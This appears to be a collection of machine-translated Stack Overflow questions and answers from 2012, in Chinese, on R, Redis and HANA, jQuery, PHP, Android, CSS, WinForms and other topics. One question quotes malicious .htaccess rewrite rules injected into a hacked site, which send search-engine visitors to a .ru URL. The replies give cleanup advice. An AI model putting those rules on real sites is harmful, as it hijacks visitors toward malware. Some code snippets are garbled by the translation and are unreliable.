ch8_28500001 0.3157895
ch18_500001  0.3157895
ch18_1500001 0.3157895
ch18_2500001 0.3157895 
```

我希望它们合并到 1 个 data.frame 或矩阵中，以便我有一个概览并且不需要在文件之间切换。但是解决这个问题似乎比仅仅使用`data.frame`.

任何人都知道如何不解决行长不同的问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:32:18.217

```
 merge(as.data.frame(loss), as.data.frame(loh), by="row.names") 
```

但它给出了空数据框，因为您的两个矩阵中都没有匹配的行名。你也可以做

```
 merge(as.data.frame(loss), as.data.frame(loh), by="row.names", all=TRUE) 
```

对于多个数据框，我会使用函数[Reduce](http://www.r-bloggers.com/applying-a-function-successively-in-r/)。

```
 Reduce(merge, list(data1, ..., dataN))) 
```

确保您也将`by`参数传递给`merge`。

# redis - SAP HANA 和 Memcached、Redis 和现有数据库被黑以使用内存而不是磁盘有什么区别？

> ID：13287149
> 
> 赞同：16
> 
> 时间：2012-11-08T10:27:28.773
> 
> 标签：redis, memcached, hana, sap-basis

SAP 的 In-Memory 数据库 HANA 在业务分析领域引起了轰动。与当前的开源数据库相比，我很难看到它的真正创新。好的，它具有索引、图形支持、列存储等……但在我看来，这并不是什么新鲜事。它是 In-Memory 的事实也不是什么新鲜事，请参阅 Memcached 和 Redis。

HANA 有什么大不了的？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-18T11:32:50.483

*   SAP HANA 是一种内存中的 RDBS，主要用于加速 SAP 应用程序。

*   Memcached（开源）是一个键/值（即 NoSQL）缓存系统，用于加速 RDBMS 和 NoSQL 数据库。与 HANA 不同，Memcached 的原生形式可以无限扩展；另一方面，Memcached 不可靠，您可能会在以下事件之一中丢失数据：（1）节点故障；(2) 缩放事件；(3) 进程重启和 (4) 软件升级。此外，它还支持非常有限的键值操作集。

*   Redis（开源）- 是一个内存中的 NoSQL 数据库。与 Memcached 不同的是，它具有内置机制以提高可靠性，例如复制和数据持久性。此外，Redis sentinel 可用于自动故障转移。与 HANA 和 memcached 不同，Redis 是从头开始构建的，除了简单的 k/v 字符串数据类型之外，它还支持增强的数据类型，如哈希、集合、排序集和列表。这使得 Redis 在处理复杂命令和简单命令方面都非常快。因此，虽然 Redis 可以像 Memcached 一样快速执行简单命令，但它处理复杂命令的速度通常比包括 HANA 在内的任何其他内存数据库快十倍。时至今日，Redis 的可扩展性仍然有限，您无法将数据集扩展到单个主服务器之外。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-28T12:53:32.090

HANA is not just in-memory database, it's application platform. If you are interested to explore its analytic capabilities here is a good example:

[http://scn.sap.com/community/developer-center/cloud-platform/blog/2013/07/16/using-hana-modeler-in-sap-hana-cloud](http://scn.sap.com/community/developer-center/cloud-platform/blog/2013/07/16/using-hana-modeler-in-sap-hana-cloud)

Try it for free from SAP Cloud trial account.

# javascript - 动态添加href

> ID：13287155
> 
> 赞同：1
> 
> 时间：2012-11-08T10:27:41.297
> 
> 标签：javascript, jquery

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T10:31:49.603

```
$(document).ready(function () {
    $('a.signOutLink').click(function () {
        window.location = "LogOut.aspx";
    });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T10:30:05.100

试试这个...

```
$(document).ready(function () {

$('.signOutLink').click(function () {
    window.location = 'LogOut.aspx';
});

); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T10:34:29.523

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-08T10:32:22.123

> $(文档).ready(函数 () {
> 
> ```
> $('.signOutLink').attr('href', 'LogOut.aspx') 
> ```
> 
> });

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-08T10:46:42.067

我要求此代码的最终目标的原因是：

如果您只想在单击链接时转到某个位置并且想要动态分配 url，则无需在`click()`事件中执行此操作。可以简单地通过在`.ready()`事件中设置属性来完成，就像这样，

`$('a.signOutLink').prop('href','LogOut.aspx'); // or using the .attr() method`

这样，一旦您单击链接，它就会跟随在`href`

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-08T11:15:48.997

谢谢大家。我使用了以下内容：

```
$('.signOutLink').click(function () {
    window.location.href("LogOut.aspx?a=b"); //Can use REPLACE also
    return false;  //FALSE

}); 
```

# forms - Symfony2回调验证设置字段属性错误

> ID：13287157
> 
> 赞同：0
> 
> 时间：2012-11-08T10:28:10.873
> 
> 标签：forms, symfony, collections, validation

我在 Symfony 2.0.4 中使用回调验证器来验证嵌入表单的集合。我正在尝试查看其中一个表单字段是否在任何表单中重复，如果是，则在该字段上添加错误。
这是代码：

```
/**  
 * @Assert\Callback(methods={"isPriceUnique"})  
 */  
class Pricing {  
    protected $defaultPrice;  
    protected $prices;  

    public function isPriceUnique(ExecutionContext $context){
    //Get the path to the field that represents the price collection
    $propertyPath = $context->getPropertyPath().'.defaultPrice';

    $addedPrices = $this->getPrices();
    \array_unshift($addedPrices, $this->getDefaultPrice());

    for($i=0; $i<\count($addedPrices); $i++){
        $price=$addedPrices[$i];
        $country=$price->getCountry();

        //Check for duplicate pricing options(whose country has been selected already)
        if($i<\count($addedPrices)-1){
            for($j=$i+1; $j<\count($addedPrices); $j++){
                if(\strcmp($country, $addedPrices[$j]->getCountry())==0){
                    $context->setPropertyPath($propertyPath.'.'.$j.'.country');
                    $context->addViolation('product.prices.unique', array(), null);
                    break;
                }
            }
        }
    }
} 
```

$prices 字段是 Price 实体的数组，每个实体都有 country 属性。国家也被添加到表单类型中。
我只想在 country 属性上添加错误，但似乎 Symfony 不允许我指定比 $propertyPath.'.field' 更复杂的内容。
谁能告诉我 $propertyPath 的语法是什么，它允许我在层次结构中指定一个较低级别的字段集？

## **更新：**

似乎验证已正确完成，在研究了 PropertyPath 类构造函数后，我确定我使用的路径是正确的。问题是指定的消息未按预期显示在国家/地区字段上。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-24T08:32:27.413

您可以使用 `$context->addViolationAt()`

[http://symfony.com/doc/2.2/reference/constraints/Callback.html#the-callback-method](http://symfony.com/doc/2.2/reference/constraints/Callback.html#the-callback-method)

# php - php字符串替换让我感到困惑

> ID：13287162
> 
> 赞同：0
> 
> 时间：2012-11-08T10:28:22.013
> 
> 标签：php, string, str-replace

这是行不通的，发生了什么应该很简单:-(

```
 $test = "hello naughty";

$swearWords = array("naughty","notallowed");

foreach ($swearWords as $naughty)
{
    $post = str_ireplace($naughty, "<b><i>(oops)</i></b>", $test);

}

echo $post; 
```

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T10:31:29.743

您（总是）使用 $test 作为输入参数。
在示例`notallowed`中，foreach 循环的第二次迭代中的指针未找到，因此输入字符串原样`$test='hello naughty'`返回。

```
<?php
$test = "hello naughty";
$swearWords = array("naughty","notallowed");

$post = $test;
foreach ($swearWords as $naughty)
{
    $post = str_ireplace($naughty, "<b><i>(oops)</i></b>", $post);
}

echo $post; 
```

印刷`hello <b><i>(oops)</i></b>`

str_ireplace 可以将针数组作为第一个参数

```
<?php
$test = "hello notallowed, this is naughty";
$post = str_ireplace(array("naughty","notallowed"), "<b><i>(oops)</i></b>", $test);
echo $post; 
```

打印`hello <b><i>(oops)</i></b>, this is <b><i>(oops)</i></b>`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T10:32:56.933

您可以直接使用数组进行替换

```
<?php

    $test = "hello naughty";
    $swearWords = array("naughty","notallowed");
    $post = str_ireplace($swearWords, "<b><i>(oops)</i></b>", $test);
    echo $post;
?> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T10:33:05.633

采用

```
$test = "hello naughty";
$swearWords = array("naughty","notallowed");
$post = str_ireplace($swearWords,"<b><i>(oops)</i></b>",$test)
echo $post; 
```

反而。有关函数处理数组参数的方式的信息，请参见[str_ireplace 。](http://php.net/manual/en/function.str-ireplace.php)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-08T10:34:32.717

试试这个

```
$test = "hello naughty";

$swearWords = array("naughty","notallowed");

foreach ($swearWords as $naughty)
{
//$post = str_ireplace($naughty, "(oops)", $test);
echo str_ireplace($naughty,"<b><i>(oops)</i></b>",$test)."<br>";

} 
```

尝试编辑的代码

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-08T10:46:15.607

为了支持其他答案，我有几个链接显示了可以帮助您的示例。

愿这些对您有所帮助并解决您的问题。

[http://www.w3schools.com/php/func_string_str_ireplace.asp](http://www.w3schools.com/php/func_string_str_ireplace.asp)

[http://php.net/manual/en/function.str-ireplace.php](http://php.net/manual/en/function.str-ireplace.php)

谢谢。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-11-08T10:32:24.750

$swearWords = array("naughty"); 然后它说（哎呀）而不是顽皮。

# android - 活动崩溃后android停止后台服务

> ID：13287163
> 
> 赞同：4
> 
> 时间：2012-11-08T10:28:29.703
> 
> 标签：android, android-service, ondestroy, uncaught-exception, uncaughtexceptionhandler

一开始，我想为糟糕的英语道歉。

我的问题是：

我在 android 中有一个服务，它在活动运行时在后台运行。（此服务以指定的时间间隔将用户数据与服务器同步）。

```
public class CService extends Service
{
   private Boolean isDestroyed;

@Override
    public int onStartCommand (Intent intent, int flags, int startId)
    {
            if (intent != null)
            {
                   new Thread(new Runnable()
                   {
                   //run new thread to disable flush memory for android and destroy this service
                           @Override
                           public void run ()
                           {
                                     this.isDestroyed = Boolean.FALSE
                                     while(!this.isDestroyed)
                                     {
                                     //loop until service isn't destroyed
                                     }
                            }

                    }).start();
            }
            return Service.START_NOT_STICKY;

    }

    @Override
    public void onDestroy ()
    {
           //THIS ISNT CALLED FROM uncaughtException IN ACTIVITY BUT from onDestroy method is this called.

           //when is service destroyed then onDestroy is called and loop finish
           this.isDestroyed = Boolean.TRUE;
    }

} 
```

并且从 onCreateMethod 中的活动开始。该活动实现 Thread.UncaughtExceptionHandler 并在 onCreate 方法中注册以捕获活动中的所有意外异常。当活动中的某些东西抛出异常方法 uncaughtException 被调用并且服务应该停止时 stopService(serviceIntent); 但是服务中的 onDestoy 没有被调用。但是，当活动中的 onDestroy 方法被调用（用户按下然后返回按钮）时，服务会成功停止并调用 CService 中的 onDestoroy。

```
 public class CActivity extends Activity implements Thread.UncaughtExceptionHandler
    {
            private Thread.UncaughtExceptionHandler defaultUEH;

        @Override
        protected void onCreate (Bundle savedInstanceState)
        {

            this.defaultUEH = Thread.getDefaultUncaughtExceptionHandler();

            // create intent for service
            Intent serviceIntent = new Intent(this, CService.class);
            // run service
            startService(serviceIntent);

            //set default handler when application crash
            Thread.setDefaultUncaughtExceptionHandler(this);
            super.onCreate(savedInstanceState);
        }

        @Override
        public void uncaughtException (Thread thread, Throwable ex)
        {
            //THIS DOESN'T WORK

            //when global exception in activity is throws then this method is called. 
            Intent serviceIntent = new Intent(this, CService.class);
            //method to service stop is called. BUT THIS METHOD DON'T CALL onDestroy in CService
            stopService(serviceIntent);
            defaultUEH.uncaughtException(thread, ex);       
        }

        @Override
        public void onDestroy ()
        {
            //this work fine
            Intent serviceIntent = new Intent(this, CService.class);
            stopService(serviceIntent);
            super.onDestroy();
            }

    } 
```

当活动崩溃时，我需要停止后台服务。因为当 android 关闭活动并开始堆栈中的前一个活动（即登录屏幕）时，现在没有用户记录。

感谢您的建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T13:29:56.363

尝试这个

```
 Thread.currentThread().setUncaughtExceptionHandler(this); 
```

**UPD**
这是默认的 android 异常处理程序

```
private static class UncaughtHandler implements Thread.UncaughtExceptionHandler {
        public void uncaughtException(Thread t, Throwable e) {
            try {
                // Don't re-enter -- avoid infinite loops if crash-reporting crashes.
                if (mCrashing) return;
                mCrashing = true;

                if (mApplicationObject == null) {
                    Slog.e(TAG, "*** FATAL EXCEPTION IN SYSTEM PROCESS: " + t.getName(), e);
                } else {
                    Slog.e(TAG, "FATAL EXCEPTION: " + t.getName(), e);
                }

                // Bring up crash dialog, wait for it to be dismissed
                ActivityManagerNative.getDefault().handleApplicationCrash(
                        mApplicationObject, new ApplicationErrorReport.CrashInfo(e));
            } catch (Throwable t2) {
                try {
                    Slog.e(TAG, "Error reporting crash", t2);
                } catch (Throwable t3) {
                    // Even Slog.e() fails!  Oh well.
                }
            } finally {
                // Try everything to make sure this process goes away.
                Process.killProcess(Process.myPid());
                System.exit(10);
            }
        }
    } 
```

我相信你没有得到 onDestroy() 调用，因为默认的 android 异常处理程序只会破坏整个进程 System.exit()。你可以尽量不要调用 defaultUEH.uncaughtException(thread, ex); 或者在（如果）您的服务被破坏之后再调用它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T15:45:34.037

伙计，顺便问一下，您为什么要在 onCreate 方法中执行操作？正如文档所说，这个方法是从主线程调用的，我实际上想知道它是如何工作的。您应该从另一个线程进行任何繁重的计算。

[http://developer.android.com/reference/android/app/Service.html](http://developer.android.com/reference/android/app/Service.html)

> 当一个 Service 组件被实际创建时，出于上述任一原因，系统实际所做的只是实例化该组件并在主线程上调用其 onCreate() 和任何其他适当的回调。由服务以适当的行为来实现这些，例如创建一个辅助线程来执行其工作。

# css - CSS3 Text Effect（文字轮廓和阴影效果）

> ID：13287164
> 
> 赞同：3
> 
> 时间：2012-11-08T10:28:32.280
> 
> 标签：css

我正在尝试使用 css3 复制文本效果

这是我要复制的文本的图像：

![在此处输入图像描述](../Images/407c200653c81f9710b56e60e0fa59e7.png)

这是我现在所拥有的：

```
h1 {

font-size:4em;  
color: #E6012F;

text-shadow:
      3px 3px 0 #888087,
     -1px -1px 0 #888087,  
      1px -1px 0 #888087,
      -1px 1px 0 #888087,
      1px 1px 0 #888087;

} 
```

这里的主要问题是，我如何做文字白色轮廓？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-08T10:39:00.393

不需要所有这些阴影，您可以通过以下方式实现所需的效果：

```
text-shadow: 1px 1px 1px #fff, 2px 2px 2px #111; 
```

阴影放置是根据在语句中定义的层次结构进行的，因此将白色阴影放在开头会将其叠加在灰色阴影之上并使其看起来像一个边框。

还值得注意的是，白色边框只会显示在阴影上而不是文本周围，因此将文本放在较暗的背景上不会在单词的顶部和左侧显示白色边框。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-11-11T02:55:16.583

你可以试试我的代码

```
text-shadow: 1px 1px 1px #FFF, 1px 1px 1px #FFF, 1px 1px 1px #FFF, 1px 3px 3px #000; 
```

如果你想要更多的阴影黑色，你可以更改`1px 3px 3px #000`为`1px 4px 3px #000`或更多

# .htaccess - .htaccess 文件不断重定向到 Google

> ID：13287168
> 
> 赞同：0
> 
> 时间：2012-11-08T10:28:40.420
> 
> 标签：.htaccess, virus

我的服务器上有 .htaccess 文件的奇怪行为。每次我删除它时，它都会返回错误的代码。所以每次我在浏览器中输入域时我都会得到谷歌，每次我在谷歌中搜索并点击指向我的网站的链接时都会得到谷歌，.htaccess 中插入的代码如下：（你能告诉我如何解决这个问题，它必须是服务器上的一些男性软件或病毒之王？）

```
ErrorDocument 500 http://regeditever.ru/tabletfocusedmilliseconds.cgi?8 
```

RewriteEngine On
RewriteCond %{HTTP_REFERER} ^。*(duckduckgo|ask|google|dogpile|archive|clusty|mahalo|mywebsearch|blekko|lycos|webcrawler|info|infospace|search|excite|goodsearch|altavista|live|msn|aol|yahoo|youtube|wikipedia|infoseek|bing |facebook|twitter|myspace|linkedin|flickr|deviantart|livejournal|tagged|badoo|mylife|ning|pinterest).(.* )
RewriteRule ^(.*)$ [http://regeditever.ru/tabletfocusedmilliseconds.cgi?8](http://regeditever.ru/tabletfocusedmilliseconds.cgi?8) [ R=301,L]

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:15:23.540

我的博客被同样的黑客入侵了。现在它很干净，我写了关于它[http://www.pedroventura.com/wordpress/como-eliminar-el-hack-o-malware-de-rr-nu-de-wordpress/](http://www.pedroventura.com/wordpress/como-eliminar-el-hack-o-malware-de-rr-nu-de-wordpress/)但它是西班牙语的，你需要翻译它。

但是我可以给你总结一下，基本上你需要找到被黑的代码。他们一直覆盖您的 .htaccess 文件的一个或多个 php 文件的概率。如果有问题或不应该存在，请尝试在文件的开头进行搜索。

清理所有代码。

更改 .htaccess 上的 644 权限

按照谷歌[https://support.google.com/webmasters/bin/answer.py?hl=en&answer=163634上的说明进行操作](https://support.google.com/webmasters/bin/answer.py?hl=en&answer=163634)

你所有的文件应该有644个权限和755个文件夹，注意这个

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-09-24T13:48:20.950

如果您的服务器因复杂程度而受到损害，则可能很难找到原因。您可以使用像 sucuri 这样的服务，他们的主页上有一个免费的扫描仪，您可以通过它找到原因，如果您愿意付费，他们会为您清理您的网站。

* * *

你说你的 .htaccess 文件被泄露了

**为了保护您的 .htaccess 文件免受黑客攻击，请在您的根 .htaccess 文件中添加以下代码**

```
# STRONG HTACCESS PROTECTION
<Files ~ "^.*\.([Hh][Tt][Aa])">
 order allow,deny
 deny from all
 satisfy all
</Files> 
```

# c# - 如何以编程方式移动使用 Windows 窗体设计器定义的控件

> ID：13287169
> 
> 赞同：0
> 
> 时间：2012-11-08T10:28:46.160
> 
> 标签：c#, winforms, forms

我认为这是一个奇怪的问题。我有一个使用窗体设计器创建的屏幕（Windows 窗体）。我现在想根据某些或其他标准以编程方式更改其中一个控件的宽度，即在运行时。

我的问题是我似乎无法做到这一点。我的方法是在表单类 InitializeComponent() 方法执行后（比如在表单构造函数的末尾）为 Width 属性分配一个新值。手表显示控件属性已更改，但随后显示的屏幕会忽略新值并使用在 InitializeComponent() 中分配的值。

我在尝试做一些不可能的事情吗？后台是否有一些巫术阻止了设计师创建的控件，或者我只是走错了路？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T10:37:40.777

检查[`Control.AutoSize`](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.autosize.aspx)和[`Control.Anchor`](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.anchor.aspx)属性。特别：

> ***`Control.Anchor`***：获取或设置控件绑定到的容器的边缘，并确定控件如何与其父级一起调整大小。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T10:33:32.437

如果控件是一个`Label`确保该`Autosize`属性设置为 false，否则 .NET 将调整控件的大小以适应内容。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T10:47:38.810

你试过`Invalidate`方法吗？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-08T13:32:40.893

您是否尝试过处理表单加载和查看时的事件？类似于： this.Loaded += MyLoadedEventHandler; 在 MyLoadEventHandler 方法中调整宽度。– 戴维奥 2 小时前

那成功了。

# javascript - 在 gwt 中访问新打开的窗口

> ID：13287178
> 
> 赞同：0
> 
> 时间：2012-11-08T10:29:16.597
> 
> 标签：javascript, gwt, popupwindow

我正在尝试通过 GWT 实现类似下面的内容（下面的代码是 javascript）。

```
function openWin() {
   var myWindow=window.open('','','width='+screen.width+',height='+screen.height+',left='+screen.width);
   myWindow.document.write("<p>This is 'myWindow'</p>");
   myWindow.document.write("<span id='span'></span>");
   myWindow.document.close();

   myWindow.document.getElementById('span').innerText = 'something';
} 
```

我如何在 gwt 中实现这一点，当我在我的 gwt 项目中尝试这个 javascript 代码本身时，`left='+screen.width`似乎不能在 FF 中工作并且`myWindow.document.getElementById('span').innerText = 'something';`似乎不能在 chrome 中工作。用 javascript 更正它们对我来说也很好，只要它适用于 FF 和 chrome。

关于使用 gwt 的 PopupPanel，那也无济于事。据我所知，PopupPanel 无法弹出页面。在我的场景中，新窗口应该在我的辅助显示中打开（这可以用当前的 js 代码实现。使用 code `'width='+screen.width+',height='+screen.height+',left='+screen.width`。（如果我错了，请指导我了解 PopupPanel 的此类属性。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T12:20:51.700

如果你想在 GWT 的单独窗口中打开某些东西，那么你可以拥有一个 GWT 模块，它有自己的托管页面。该模块可以具有您想要的显示/逻辑。您可以使用另一个 GWT 模块中的 Window.open 打开此页面。

# ios - iOS 上的 CoreImage CIDotScreen

> ID：13287181
> 
> 赞同：0
> 
> 时间：2012-11-08T10:29:25.397
> 
> 标签：ios, ios6, core-image, cifilter

我正在尝试在 iOS 应用程序中使用 CIDotScreen。在 iOS 6 下应该支持 CIDotScreen，但是当我创建一个过滤器时：

`[CIFilter filterWithName:@"CIDotScreen" keysAndValues:kCIInputImageKey, beginImage, kCIInputCenterKey...`

编译器抱怨`kCIInputCenterKey`在 iOS 上不可用。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:19:36.633

[**kCIInputCenterKey**](http://developer.apple.com/library/mac/documentation/GraphicsImaging/Reference/QuartzCoreFramework/Classes/CIFilter_Class/Reference/Reference.html#//apple_ref/doc/c_ref/kCIInputCenterKey)

```
A key for a CIVector object that specifies the center of the area, as x and y- coordinates, to be filtered.

Available in OS X v10.5 and later. Not available in iOS. 
```

[***iOS 中过滤器输入参数的可用键。***](http://developer.apple.com/library/ios/documentation/GraphicsImaging/Reference/QuartzCoreFramework/Classes/CIFilter_Class/Reference/Reference.html#//apple_ref/doc/uid/TP40003960-RH2-SW4)

1.  kCIOutputImageKey；
2.  kCIInputBackgroundImageKey;
3.  kCIInputImageKey;
4.  kCIInputVersionKey；

所以我们需要接受编译器的投诉

# javascript - 从 div 中显示/隐藏列表 ul

> ID：13287183
> 
> 赞同：-1
> 
> 时间：2012-11-08T10:29:29.673
> 
> 标签：javascript, jquery, html

我有这个代码：

```
<ul>
 <div class="sub_cat_box"> 

 <li class="current"><a href="#">Cat 1</a></li> 
   <ul> 
     <li><a href="#">Prod1</a></li> 
     <li><a href="#">Prod1</a></li> 
   </ul> 

 </div> 

 <div class="sub_cat_box"> 

 <li class="current"><a href="#">Cat 2</a></li> 
   <ul> 
     <li><a href="#">Prod1</a></li> 
     <li><a href="#">Prod1</a></li> 
   </ul> 

  </div> 
</ul> 
```

我想`<ul>`在单击时显示/隐藏每个孩子`<li class='current'>`。我尝试使用 jQuery，但没有成功。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-08T10:37:01.303

使用 jQuery 通过类选择器选择 li 元素，然后将事件处理程序绑定到 click 函数。绑定函数应该找到与所选元素相关的下一个 ul 并在其上调用[切换](http://api.jquery.com/toggle/)方法。默认情况下，jQuery 切换方法将切换元素的可见性：

```
$(".current").click(function(){
  $(this).next("ul").toggle();
}); 
```

工作示例：http: [//jsfiddle.net/ytXFQ/](http://jsfiddle.net/ytXFQ/)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-08T10:42:46.857

您的 HTML 不正确。

试试这个 HTML 结构：

```
<ul>
 <li class="current">
    <a href="javascript: toggleChildren('cat1');">Cat 1</a>
    <div class="sub_cat_box" id="cat1">
      <ul> 
        <li><a href="#">Prod1</a></li> 
        <li><a href="#">Prod1</a></li> 
      </ul> 
    </div>
  </li> 
</ul> 
```

功能：

```
function toggleChildren(id) {

   var elem = document.getElementById(id);
   if(!elem) alert("error: not found!");
   else {

      if(elem.style.display == "block")
         elem.style.display = "none";

      else
         elem.style.display = "block";
   }
} 
```

CSS：

```
.sub_cat_box {display: none;} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T10:43:34.740

您的 HTML 无效（在 ul 中只允许使用 il，并且 div 和其他 ul 必须在 lis 中）。它应该是这样的：

```
<ul>

    <li class="current"><div class="sub_cat_box"> 
       <a href="#">Cat 1</a>
       <ul> 
         <li><a href="#">Prod1</a></li> 
         <li><a href="#">Prod1</a></li> 
       </ul> 
       </div> 
      </li> 
     <li class="current">     
      <div class="sub_cat_box"> <a href="#">Cat 2</a> 
       <ul> 
         <li><a href="#">Prod1</a></li> 
         <li><a href="#">Prod1</a></li> 
       </ul>         
      </div> 
    </li>
    </ul> 
```

完成后，您可以应用如下代码：

```
$(".current").click(function(e){
     $(this).find('ul').toggle();
}) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-08T10:37:11.340

```
$('li.current').on('click', 'a', function() {
  $(this).parent().find('ul').toggle();
  return false;
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-08T10:37:25.810

用这个：

```
$(document).on("click", "li.current > a", function(){
   $(this).next().slideToggle();
}); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-08T10:39:39.737

你可以这样做：

```
$('.current').next('ul').hide();​​​ // Make them hide by default
  $('.current').click(function(){
     $(this).next('ul').slideToggle();
  }); 
```

[现场演示](http://jsfiddle.net/yyy7u/2/)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-11-08T10:42:20.017

尝试这个：

```
$("ul > li.current").on('click', 'a', function(){
      $('ul.class').children().toggle();
    }); 
```

您的 ul 课程在哪里。我认为这是最干净的 jQuery 代码。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-11-08T10:45:55.937

```
$('li.current a').click(function(){
  $(this).parent().next('ul').slideToggle(); // or
  //$(this).parent().next('ul').toggle();
}); 
```

# android - Android RelativeLayout addrule 在添加膨胀视图时不起作用

> ID：13287185
> 
> 赞同：3
> 
> 时间：2012-11-08T10:29:34.647
> 
> 标签：android, layout, android-relativelayout, custom-component, viewgroup

我将 xml 文件膨胀到自定义视图并将其添加到相对布局。

在将自定义视图添加到相对布局时，我正在使用 addRule 方法设置一些规则。但是视图总是在左上角添加，我在这里遗漏了什么吗？

这是我的代码和布局。

MainActivity.java

```
public class MainActivity extends Activity {

        @Override
        protected void onCreate(android.os.Bundle savedInstanceState) 
        {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.mainLayout);
            RelativeLayout rl = (RelativeLayout)findViewById(R.id.relativeLayout);

            CustomLayout cLayout = new CustomLayout(this);
            RelativeLayout.LayoutParams lp = new  RelativeLayout.LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT);
            lp.addRule(RelativeLayout.BELOW, R.id.title);
            cLayout.setLayoutParams(lp);
            rl.addView(cLayout);        
        };
    } 
```

自定义布局.java

```
public class CustomLayout extends RelativeLayout {

    public CustomLayout(Context context) {
        super(context);
        LayoutInflater.from(context).inflate(R.layout.customlayout, this);
    }
} 
```

主布局.xml

```
<HorizontalScrollView
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/contentScroller"
    android:layout_width="wrap_content"
    android:layout_height="match_parent">
    <RelativeLayout
        android:layout_width="wrap_content"
        android:layout_height="match_parent" >

        <RelativeLayout
            android:id="@+id/mainInfo"
            android:layout_width="400dp"
            android:layout_height="match_parent" >

            <ImageView
                android:id="@+id/mainImage"
                android:layout_width="200dp"
                android:layout_height="200dp"
                android:src="@drawable/lines"/>
            <TextView 
                android:id="@+id/mainDesc" 
                android:layout_width="match_parent"
                android:layout_height="match_parent"
                android:layout_below="@+id/mainImage"
                android:textColor="@android:color/white"
                android:text="@string/desc"/>
        </RelativeLayout>
        <RelativeLayout 
            android:id="@+id/relativeLayout"
            android:layout_height="match_parent"
            android:layout_width="match_parent"
            android:layout_toRightOf="@+id/mainInfo">
            <TextView
                android:id="@+id/title"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content" 
                android:text="@string/titletext"/>
       </RelativeLayout>
    </RelativeLayout>
</HorizontalScrollView> 
```

自定义布局.xml

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:id="@+id/background">
<ImageView
    android:id="@+id/icon"
    android:layout_width="100dp"
    android:layout_height="100dp"
    android:layout_alignParentLeft="true"
    android:layout_alignParentTop="true"
    android:layout_marginRight="10dp"
    android:scaleType="fitStart"
    android:src="@drawable/appicon" >
</ImageView>
<TextView
    android:id="@+id/name"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:text="@string/sampletext"
    android:layout_toRightOf="@+id/icon"/>
</RelativeLayout> 
```

# java - Java中函数流的进出日志

> ID：13287186
> 
> 赞同：5
> 
> 时间：2012-11-08T10:29:36.567
> 
> 标签：java, logging

我是Java新手，我必须记录函数流的进入和退出，在C++中很容易做到，但我不知道如何在Java中做到这一点。
任何输入将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T10:38:34.807

有几个日志库（log4J [http://logging.apache.org/log4j/1.2/](http://logging.apache.org/log4j/1.2/)是常用的）和 slf4J [http://www.slf4j.org/](http://www.slf4j.org/)特别有用，因为它与库无关。

如果您想记录每个函数的进入/退出，您可以查看本文中提到的 AspectJ/AOP[如何将 AOP 与 AspectJ 一起使用进行记录？](https://stackoverflow.com/questions/8839077/how-to-use-aop-with-aspectj-for-logging)

# svn - svn 用户提交时 SubGit 错误

> ID：13287190
> 
> 赞同：0
> 
> 时间：2012-11-08T10:29:47.920
> 
> 标签：svn, commit, rename, tmp, subgit

我刚刚安装了 SubGit 并对其进行了测试。当一个 svn 用户提交文件时，他收到以下错误消息：

提交失败（详细信息如下）：“预提交”挂钩失败，错误输出：

SubGit 错误报告（SubGit 版本 1.0.2 ('Miai') build #1764）：

您收到此消息是因为您的存储库中安装了 SubGit (http://subgit.com/)，并且在 SubGit 翻译引擎中出现了需要处理的错误。

不可恢复的错误：svn：无法将文件 'F:\svn\testsubgit\db\node-origins\0.tmp' 重命名为 'F:\svn\testsubgit\db\node-origins\0'

当前状态：颠覆：只读 Git：读写

恢复：遵循 [http://subgit.com/book/#recovery中描述的错误恢复程序](http://subgit.com/book/#recovery)

报告：1) 从服务器获取错误日志'F:\svn\testsubgit\subgit\subgit-sync-20121108-180124.zip'

```
2) Report an issue at http://issues.tmatesoft.com/ 
```

